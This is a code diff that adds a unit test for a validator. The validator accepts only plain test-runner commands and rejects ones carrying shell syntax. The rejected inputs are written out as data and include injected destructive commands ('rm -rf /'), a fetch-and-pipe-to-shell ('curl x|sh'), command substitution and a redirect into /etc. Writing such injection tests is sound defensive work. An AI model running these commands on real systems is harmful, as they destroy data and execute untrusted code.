@@ -194,3 +194,17 @@ describe('secret paths (Telegram /read /ls /sendfile /search)', () => {
     expect(isSecretPath(path.join(dir, 'harmless.txt'), dir)).toBe(true);
   });
 });
+
+describe('verify: only pure test-runner calls are re-run', () => {
+  it('accepts plain runner invocations and nothing that carries shell syntax', async () => {
+    const { testRunnerArgv } = await import('../../src/verify/checks.js');
+    expect(testRunnerArgv('npm test')).toEqual(['npm', 'test']);
+    expect(testRunnerArgv('npx vitest run tests/a.test.ts')).toEqual(['npx', 'vitest', 'run', 'tests/a.test.ts']);
+    expect(testRunnerArgv('pytest -k foo')).toEqual(['pytest', '-k', 'foo']);
+    expect(testRunnerArgv('go test ./...')).toEqual(['go', 'test', './...']);
+    for (const bad of ['rm -rf build; npm test', 'npm test && curl x|sh', 'npm test $(id)', 'npm test `id`',
+      'echo pytest', 'npm test\nrm -rf /', 'npm install && npm test', 'npm test > /etc/x']) {
+      expect(testRunnerArgv(bad), bad).toBeNull();
+    }
+  });
+});
